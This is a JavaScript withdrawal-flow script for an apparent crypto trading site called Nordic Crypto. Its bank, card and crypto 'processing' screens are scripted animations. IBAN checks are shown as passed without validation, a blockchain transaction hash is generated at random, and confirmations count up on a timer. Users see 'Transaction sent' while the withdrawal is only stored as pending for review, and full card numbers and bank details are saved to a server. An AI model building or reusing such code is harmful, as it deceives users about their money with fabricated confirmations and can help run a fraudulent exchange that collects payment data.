/* ============================================================
   NORDIC CRYPTO — WITHDRAWAL FLOW v1.0
   Professional multi-step withdrawal UX.
   Overrides legacy submitWithdraw to show method-specific flows.
   ============================================================ */

(function () {
  'use strict';

  // ============================================================
  // HELPERS
  // ============================================================

  function $(id) { return document.getElementById(id); }

  function fmtMoney(n) {
    return '$' + Number(n).toLocaleString('en-US', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    });
  }

  function fmtCrypto(n, symbol) {
    var d = (symbol === 'USDT') ? 2 : 8;
    return Number(n).toFixed(d) + ' ' + symbol;
  }

  function genHash(len) {
    var chars = '0123456789abcdef';
    var s = '0x';
    for (var i = 0; i < (len || 64); i++) {
      s += chars[Math.floor(Math.random() * chars.length)];
    }
    return s;
  }

  function esc(s) {
    return String(s).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }

  function copyText(txt) {
    if (navigator.clipboard) {
      navigator.clipboard.writeText(txt).then(function () {
        if (typeof window.toast === 'function') window.toast('✓ Copied');
      });
    }
  }

  // ============================================================
  // STAGE MANAGEMENT
  // ============================================================

  /**
   * Show a specific stage of the withdrawal modal.
   * @param {string} stage - 'form' | 'processing' | 'success'
   */
  function showStage(stage) {
    var form = document.querySelector('.wd-form-stage');
    var processing = document.querySelector('.wd-processing');
    var success = document.querySelector('.wd-success');

    if (form) form.style.display = stage === 'form' ? 'block' : 'none';
    if (processing) processing.classList.toggle('on', stage === 'processing');
    if (success) success.classList.toggle('on', stage === 'success');
  }

  // ============================================================
  // IBAN PROCESSING
  // ============================================================

  function processIban(amount, details) {
    var processing = document.querySelector('.wd-processing');
    if (!processing) return;

    processing.innerHTML =
      '<div class="wd-processing-icon bank">🏦</div>' +
      '<h3 class="wd-processing-title">Sending to bank</h3>' +
      '<p class="wd-processing-desc">Your withdrawal is being processed.<br>Bank transfers usually take 1-3 business days.</p>' +
      '<div class="wd-iban-validation">' +
        '<div class="wd-iban-part" style="animation-delay:0.1s">' +
          '<span class="wd-iban-label">Recipient</span>' +
          '<span class="wd-iban-value">' + esc(details.name || '—') + ' <span class="wd-iban-check">✓</span></span>' +
        '</div>' +
        '<div class="wd-iban-part" style="animation-delay:0.4s">' +
          '<span class="wd-iban-label">IBAN</span>' +
          '<span class="wd-iban-value">' + esc((details.iban || '').slice(0, 8)) + '…' + esc((details.iban || '').slice(-4)) + ' <span class="wd-iban-check">✓</span></span>' +
        '</div>' +
        '<div class="wd-iban-part" style="animation-delay:0.7s">' +
          '<span class="wd-iban-label">SWIFT / BIC</span>' +
          '<span class="wd-iban-value">' + esc(details.swift || '—') + ' <span class="wd-iban-check">✓</span></span>' +
        '</div>' +
        '<div class="wd-iban-part" style="animation-delay:1.0s">' +
          '<span class="wd-iban-label">Bank</span>' +
          '<span class="wd-iban-value">' + esc(details.bank || 'NordicCrypto Bank AB') + ' <span class="wd-iban-check">✓</span></span>' +
        '</div>' +
      '</div>' +
      '<div class="wd-progress-steps" id="wdSteps"></div>' +
      '<div class="wd-live-data" id="wdLiveData"></div>';

    showStage('processing');
    runIbanSteps(amount, details);
  }

  function runIbanSteps(amount, details) {
    var stepsEl = $('wdSteps');
    var liveEl = $('wdLiveData');
    if (!stepsEl) return;

    var steps = [
      { text: 'Validating IBAN', duration: 1200 },
      { text: 'Verifying recipient', duration: 1000 },
      { text: 'Submitting to bank', duration: 1500 },
      { text: 'Waiting for confirmation', duration: 2000 }
    ];

    stepsEl.innerHTML = '';
    steps.forEach(function (s, i) {
      var step = document.createElement('div');
      step.className = 'wd-step';
      step.id = 'wdStep' + i;
      step.innerHTML =
        '<div class="wd-step-icon">' + (i + 1) + '</div>' +
        '<div class="wd-step-text">' + s.text + '</div>' +
        '<div class="wd-step-time"></div>';
      stepsEl.appendChild(step);
    });

    var totalMs = 0;
    steps.forEach(function (s, i) {
      setTimeout(function () {
        var step = $('wdStep' + i);
        if (!step) return;
        step.classList.add('active');
        step.querySelector('.wd-step-icon').textContent = '…';
        step.querySelector('.wd-step-time').textContent = 'in progress';

        // Mark previous as done
        if (i > 0) {
          var prev = $('wdStep' + (i - 1));
          if (prev) {
            prev.classList.remove('active');
            prev.classList.add('done');
            prev.querySelector('.wd-step-icon').textContent = '✓';
            prev.querySelector('.wd-step-time').textContent = 'done';
          }
        }
      }, totalMs);
      totalMs += s.duration;
    });

    // Show live data progressively
    setTimeout(function () {
      if (!liveEl) return;
      liveEl.innerHTML =
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Amount</span>' +
          '<span class="wd-live-value">' + fmtMoney(amount) + '</span>' +
        '</div>' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Method</span>' +
          '<span class="wd-live-value">Bank Transfer (SEPA)</span>' +
        '</div>' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Reference</span>' +
          '<span class="wd-live-value muted">Generated on send</span>' +
        '</div>';
    }, 1500);

    // Finish
    setTimeout(function () {
      var last = $('wdStep' + (steps.length - 1));
      if (last) {
        last.classList.remove('active');
        last.classList.add('done');
        last.querySelector('.wd-step-icon').textContent = '✓';
        last.querySelector('.wd-step-time').textContent = 'done';
      }
      setTimeout(function () {
        showIbanSuccess(amount, details);
      }, 400);
    }, totalMs);
  }

  function showIbanSuccess(amount, details) {
    var success = document.querySelector('.wd-success');
    if (!success) return;

    var eta = new Date(Date.now() + 2 * 24 * 60 * 60 * 1000);
    var etaStr = eta.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });

    success.innerHTML =
      '<div class="wd-success-icon">✓</div>' +
      '<h3 class="wd-success-title">Withdrawal submitted</h3>' +
      '<p class="wd-success-desc">Your bank transfer has been sent for processing.</p>' +
      '<div class="wd-success-amount">' + fmtMoney(amount) + '</div>' +
      '<div class="wd-success-details">' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Recipient</span>' +
          '<span class="wd-live-value">' + esc(details.name || '—') + '</span>' +
        '</div>' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">IBAN</span>' +
          '<span class="wd-live-value">' + esc((details.iban || '').slice(0, 8)) + '…' + esc((details.iban || '').slice(-4)) + '</span>' +
        '</div>' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Estimated arrival</span>' +
          '<span class="wd-live-value positive">' + etaStr + '</span>' +
        '</div>' +
      '</div>' +
      '<div class="wd-success-actions">' +
        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
      '</div>';

    showStage('success');
    if (typeof window.playChime === 'function') window.playChime();
  }

  // ============================================================
  // CARD PROCESSING
  // ============================================================

  function processCard(amount, details) {
    var processing = document.querySelector('.wd-processing');
    if (!processing) return;

    var last4 = (details.cardNumber || '').replace(/\s/g, '').slice(-4);

    processing.innerHTML =
      '<div class="wd-processing-icon card">💳</div>' +
      '<h3 class="wd-processing-title">Refunding to card</h3>' +
      '<p class="wd-processing-desc">Your card refund is being initiated.<br>Refunds usually take 3-5 business days.</p>' +
      '<div class="wd-card-swipe">' +
        '<div class="wd-card-mini">' +
          '<div class="wd-card-mini-label">Card</div>' +
          '<div class="wd-card-mini-num">•••• •••• •••• ' + esc(last4) + '</div>' +
          '<div class="wd-card-mini-footer">' +
            '<span>' + esc(details.cardName || '—') + '</span>' +
            '<span>' + esc(details.expiry || '') + '</span>' +
          '</div>' +
        '</div>' +
      '</div>' +
      '<div class="wd-progress-steps" id="wdSteps"></div>' +
      '<div class="wd-live-data" id="wdLiveData"></div>';

    showStage('processing');
    runCardSteps(amount, details, last4);
  }

  function runCardSteps(amount, details, last4) {
    var stepsEl = $('wdSteps');
    if (!stepsEl) return;

    var steps = [
      { text: 'Verifying card details', duration: 1200 },
      { text: 'Contacting card network', duration: 1400 },
      { text: 'Initiating refund', duration: 1600 }
    ];

    stepsEl.innerHTML = '';
    steps.forEach(function (s, i) {
      var step = document.createElement('div');
      step.className = 'wd-step';
      step.id = 'wdStep' + i;
      step.innerHTML =
        '<div class="wd-step-icon">' + (i + 1) + '</div>' +
        '<div class="wd-step-text">' + s.text + '</div>' +
        '<div class="wd-step-time"></div>';
      stepsEl.appendChild(step);
    });

    var totalMs = 0;
    steps.forEach(function (s, i) {
      setTimeout(function () {
        var step = $('wdStep' + i);
        if (!step) return;
        step.classList.add('active');
        step.querySelector('.wd-step-icon').textContent = '…';
        step.querySelector('.wd-step-time').textContent = 'in progress';
        if (i > 0) {
          var prev = $('wdStep' + (i - 1));
          if (prev) {
            prev.classList.remove('active');
            prev.classList.add('done');
            prev.querySelector('.wd-step-icon').textContent = '✓';
            prev.querySelector('.wd-step-time').textContent = 'done';
          }
        }
      }, totalMs);
      totalMs += s.duration;
    });

    setTimeout(function () {
      var liveEl = $('wdLiveData');
      if (!liveEl) return;
      liveEl.innerHTML =
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Amount</span>' +
          '<span class="wd-live-value">' + fmtMoney(amount) + '</span>' +
        '</div>' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Card</span>' +
          '<span class="wd-live-value">•••• ' + esc(last4) + '</span>' +
        '</div>';
    }, 1500);

    setTimeout(function () {
      var last = $('wdStep' + (steps.length - 1));
      if (last) {
        last.classList.remove('active');
        last.classList.add('done');
        last.querySelector('.wd-step-icon').textContent = '✓';
        last.querySelector('.wd-step-time').textContent = 'done';
      }
      setTimeout(function () {
        showCardSuccess(amount, details, last4);
      }, 400);
    }, totalMs);
  }

  function showCardSuccess(amount, details, last4) {
    var success = document.querySelector('.wd-success');
    if (!success) return;

    var eta = new Date(Date.now() + 4 * 24 * 60 * 60 * 1000);
    var etaStr = eta.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });

    success.innerHTML =
      '<div class="wd-success-icon">✓</div>' +
      '<h3 class="wd-success-title">Refund initiated</h3>' +
      '<p class="wd-success-desc">Your card refund has been submitted.</p>' +
      '<div class="wd-success-amount">' + fmtMoney(amount) + '</div>' +
      '<div class="wd-success-details">' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Card</span>' +
          '<span class="wd-live-value">•••• ' + esc(last4) + '</span>' +
        '</div>' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Estimated refund</span>' +
          '<span class="wd-live-value positive">' + etaStr + '</span>' +
        '</div>' +
      '</div>' +
      '<div class="wd-success-actions">' +
        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
      '</div>';

    showStage('success');
    if (typeof window.playChime === 'function') window.playChime();
  }

  // ============================================================
  // CRYPTO PROCESSING
  // ============================================================

  function processCrypto(amount, details) {
    var processing = document.querySelector('.wd-processing');
    if (!processing) return;

    var coin = details.coin || 'USDT';
    var network = details.network || 'ERC20';
    var address = details.address || '';
    var txHash = genHash(64);

    processing.innerHTML =
      '<div class="wd-processing-icon crypto">⛓️</div>' +
      '<h3 class="wd-processing-title">Broadcasting transaction</h3>' +
      '<p class="wd-processing-desc">Sending ' + fmtCrypto(amount, coin) + ' to ' + esc(network) + ' network.</p>' +
      '<div class="wd-network-viz" id="wdNetworkViz">' +
        '<div class="wd-network-node active"></div>' +
        '<div class="wd-network-line"></div>' +
        '<div class="wd-network-node"></div>' +
        '<div class="wd-network-line"></div>' +
        '<div class="wd-network-node"></div>' +
        '<div class="wd-network-line"></div>' +
        '<div class="wd-network-node"></div>' +
      '</div>' +
      '<div class="wd-progress-steps" id="wdSteps"></div>' +
      '<div class="wd-live-data" id="wdLiveData"></div>';

    showStage('processing');
    runCryptoSteps(amount, details, coin, network, address, txHash);
  }

  function runCryptoSteps(amount, details, coin, network, address, txHash) {
    var stepsEl = $('wdSteps');
    if (!stepsEl) return;

    var steps = [
      { text: 'Signing transaction', duration: 900 },
      { text: 'Broadcasting to network', duration: 1200 },
      { text: 'Awaiting confirmations', duration: 3000 }
    ];

    stepsEl.innerHTML = '';
    steps.forEach(function (s, i) {
      var step = document.createElement('div');
      step.className = 'wd-step';
      step.id = 'wdStep' + i;
      step.innerHTML =
        '<div class="wd-step-icon">' + (i + 1) + '</div>' +
        '<div class="wd-step-text">' + s.text + '</div>' +
        '<div class="wd-step-time"></div>';
      stepsEl.appendChild(step);
    });

    var totalMs = 0;
    steps.forEach(function (s, i) {
      setTimeout(function () {
        var step = $('wdStep' + i);
        if (!step) return;
        step.classList.add('active');
        step.querySelector('.wd-step-icon').textContent = '…';
        step.querySelector('.wd-step-time').textContent = 'in progress';

        // Animate network nodes
        var nodes = document.querySelectorAll('.wd-network-node');
        nodes.forEach(function (n, idx) {
          if (idx <= i) n.classList.add('active');
          if (idx < i) { n.classList.remove('active'); n.classList.add('done'); }
        });

        if (i > 0) {
          var prev = $('wdStep' + (i - 1));
          if (prev) {
            prev.classList.remove('active');
            prev.classList.add('done');
            prev.querySelector('.wd-step-icon').textContent = '✓';
            prev.querySelector('.wd-step-time').textContent = 'done';
          }
        }
      }, totalMs);
      totalMs += s.duration;
    });

    // Live data with hash + confirmations
    setTimeout(function () {
      var liveEl = $('wdLiveData');
      if (!liveEl) return;
      liveEl.innerHTML =
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Amount</span>' +
          '<span class="wd-live-value">' + fmtCrypto(amount, coin) + '</span>' +
        '</div>' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Network</span>' +
          '<span class="wd-live-value">' + esc(network) + '</span>' +
        '</div>' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">To</span>' +
          '<span class="wd-live-value muted">' + esc(address.slice(0, 10)) + '…' + esc(address.slice(-8)) + '</span>' +
        '</div>' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">TX Hash</span>' +
          '<span class="wd-live-value hash">' +
            '<a href="#" onclick="event.preventDefault();">' + esc(txHash.slice(0, 16)) + '…' + esc(txHash.slice(-8)) + ' ↗</a>' +
            '<button class="wd-copy-btn" data-copy="' + esc(txHash) + '">📋</button>' +
          '</span>' +
        '</div>' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Confirmations</span>' +
          '<span class="wd-live-value warning" id="wdConfirmations">0 / 3</span>' +
        '</div>';

      // Bind copy
      var copyBtn = liveEl.querySelector('[data-copy]');
      if (copyBtn) {
        copyBtn.onclick = function (e) {
          e.stopPropagation();
          copyText(this.getAttribute('data-copy'));
        };
      }

      // Confirmations counter
      var conf = 0;
      var confInterval = setInterval(function () {
        conf++;
        var confEl = $('wdConfirmations');
        if (confEl) {
          if (conf >= 3) {
            confEl.textContent = '3 / 3 ✓';
            confEl.className = 'wd-live-value positive';
            clearInterval(confInterval);
          } else {
            confEl.textContent = conf + ' / 3';
          }
        }
      }, 1200);
    }, 1500);

    // Finish
    setTimeout(function () {
      var last = $('wdStep' + (steps.length - 1));
      if (last) {
        last.classList.remove('active');
        last.classList.add('done');
        last.querySelector('.wd-step-icon').textContent = '✓';
        last.querySelector('.wd-step-time').textContent = 'done';
      }
      var nodes = document.querySelectorAll('.wd-network-node');
      nodes.forEach(function (n) { n.classList.remove('active'); n.classList.add('done'); });

      setTimeout(function () {
        showCryptoSuccess(amount, details, coin, network, txHash);
      }, 600);
    }, totalMs);
  }

  function showCryptoSuccess(amount, details, coin, network, txHash) {
    var success = document.querySelector('.wd-success');
    if (!success) return;

    success.innerHTML =
      '<div class="wd-success-icon">✓</div>' +
      '<h3 class="wd-success-title">Transaction sent</h3>' +
      '<p class="wd-success-desc">Your crypto withdrawal has been broadcast to the ' + esc(network) + ' network.</p>' +
      '<div class="wd-success-amount">' + fmtCrypto(amount, coin) + '</div>' +
      '<div class="wd-success-details">' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">To</span>' +
          '<span class="wd-live-value muted">' + esc((details.address || '').slice(0, 10)) + '…' + esc((details.address || '').slice(-8)) + '</span>' +
        '</div>' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">TX Hash</span>' +
          '<span class="wd-live-value hash">' +
            '<a href="#" onclick="event.preventDefault();">' + esc(txHash.slice(0, 16)) + '…' + esc(txHash.slice(-8)) + ' ↗</a>' +
            '<button class="wd-copy-btn" data-copy="' + esc(txHash) + '">📋</button>' +
          '</span>' +
        '</div>' +
        '<div class="wd-live-row">' +
          '<span class="wd-live-label">Confirmations</span>' +
          '<span class="wd-live-value positive">3 / 3 ✓</span>' +
        '</div>' +
      '</div>' +
      '<div class="wd-success-actions">' +
        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
      '</div>';

    // Bind copy
    var copyBtn = success.querySelector('[data-copy]');
    if (copyBtn) {
      copyBtn.onclick = function (e) {
        e.stopPropagation();
        copyText(this.getAttribute('data-copy'));
      };
    }

    showStage('success');
    if (typeof window.playChime === 'function') window.playChime();
    if (typeof window.spawnConfetti === 'function') window.spawnConfetti();
  }

  // ============================================================
  // OVERRIDE LEGACY submitWithdraw
  // ============================================================

  /**
   * Override legacy submitWithdraw to show the new multi-stage flow.
   * Preserves validation and state logic.
   */
  window.submitWithdraw = function () {
    var amountEl = document.getElementById('wdAmount');
    var methodEl = document.getElementById('wdMethod');
    var errEl = document.getElementById('wdError');
    if (!amountEl || !methodEl || !errEl) return;

    var amount = parseFloat(amountEl.value) || 0;
    var method = methodEl.value;

    function showErr(msg) {
      errEl.textContent = msg;
      errEl.style.display = 'block';
    }
    errEl.style.display = 'none';

    if (amount <= 0) return showErr('Enter a valid amount');
    if (amount > window.st.usd) return showErr('Amount exceeds available balance');

    var details = {};

    if (method === 'iban') {
      var name = (document.getElementById('wdIbanName') || {}).value || '';
      var iban = (document.getElementById('wdIbanNumber') || {}).value || '';
      var swift = (document.getElementById('wdIbanSwift') || {}).value || '';
      var bank = (document.getElementById('wdIbanBank') || {}).value || '';
      var country = (document.getElementById('wdIbanCountry') || {}).value || '';
      name = name.trim(); iban = iban.trim(); swift = swift.trim();

      if (name.length < 2) return showErr('Enter recipient name');
      if (iban.replace(/\s/g, '').length < 15) return showErr('Enter valid IBAN');
      if (swift.length < 6) return showErr('Enter valid SWIFT / BIC');

      details = { name: name, iban: iban, swift: swift, bank: bank, country: country };
    } else if (method === 'card') {
      var cn = (document.getElementById('wdCardName') || {}).value || '';
      var num = (document.getElementById('wdCardNumber') || {}).value || '';
      var exp = (document.getElementById('wdCardExpiry') || {}).value || '';
      cn = cn.trim(); num = num.trim(); exp = exp.trim();

      if (cn.length < 2) return showErr('Enter card holder name');
      if (num.replace(/\s/g, '').length < 16) return showErr('Enter valid card number');
      if (!/^\d{2}\/\d{2}$/.test(exp)) return showErr('Expiry must be MM/YY');

      details = { cardName: cn, cardNumber: num, expiry: exp };
    } else if (method === 'crypto') {
      var dest = (document.getElementById('wdCryptoDest') || {}).value || 'external';
      var net = (document.getElementById('wdCryptoNetwork') || {}).value || 'ERC20';
      var coin = (document.getElementById('wdCryptoCoin') || {}).value || 'USDT';
      var addr = (document.getElementById('wdCryptoAddress') || {}).value || '';
      var memo = (document.getElementById('wdCryptoMemo') || {}).value || '';
      addr = addr.trim();

      if (addr.length < 10) return showErr('Enter valid wallet address');

      details = { destination: dest, network: net, coin: coin, address: addr, memo: memo };
    }

    // Save to state (as legacy did)
    var wd = {
      id: 'wd_' + Date.now(),
      amount: amount,
      currency: (window.st.currency || 'USD'),
      method: method,
      status: 'pending',
      createdAt: Date.now(),
      reviewedAt: null,
      reason: '',
      reviewedBy: '',
      details: details
    };

    if (!window.st.withdrawals) window.st.withdrawals = [];
    window.st.withdrawals.unshift(wd);

    if (typeof window.saveToServer === 'function') window.saveToServer();
    if (typeof window.render === 'function') window.render();

    // Show method-specific processing
    if (method === 'iban') {
      processIban(amount, details);
    } else if (method === 'card') {
      processCard(amount, details);
    } else if (method === 'crypto') {
      processCrypto(amount, details);
    }
  };

  // ============================================================
  // HELPERS — showStage hook on modal open
  // ============================================================

  // When modal opens, reset to form stage
  var _origOpenWithdraw = window.openWithdraw;
  if (typeof _origOpenWithdraw === 'function') {
    window.openWithdraw = function () {
      _origOpenWithdraw.apply(this, arguments);
      setTimeout(function () {
        showStage('form');
        var formStage = document.querySelector('.wd-form-stage');
        if (!formStage) {
          // If legacy modal doesn't have .wd-form-stage, wrap
          var card = document.querySelector('#withdrawModal .wd-modal-card');
          if (card && !document.querySelector('.wd-form-stage')) {
            var wrapper = document.createElement('div');
            wrapper.className = 'wd-form-stage';
            while (card.firstChild) wrapper.appendChild(card.firstChild);
            card.appendChild(wrapper);
            var processing = document.createElement('div');
            processing.className = 'wd-processing';
            card.appendChild(processing);
            var success = document.createElement('div');
            success.className = 'wd-success';
            card.appendChild(success);
          }
        }
        showStage('form');
      }, 50);
    };
  }

  console.log('%c[NordicCrypto] 💸 Withdrawal Flow v1.0 loaded', 'color:#ec4899;font-weight:bold;font-size:13px');

})();
